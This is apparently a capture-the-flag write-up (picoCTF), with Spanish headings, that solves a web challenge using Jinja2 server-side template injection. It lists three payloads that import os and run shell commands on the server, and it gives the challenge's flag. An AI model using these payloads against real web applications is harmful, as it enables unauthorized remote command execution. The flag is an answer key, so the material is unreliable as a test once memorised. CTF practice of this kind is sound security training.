
Descripcion:
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:56665/)!
Solucion(s):
http://rescued-float.picoctf.net:56665/
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}
Notas:
se utilizo un injeccion remota
Referencias:
se saco el codigo de inyeccion de qui:
https://onsecurity.io/article/server-side-template-injection-with-jinja2/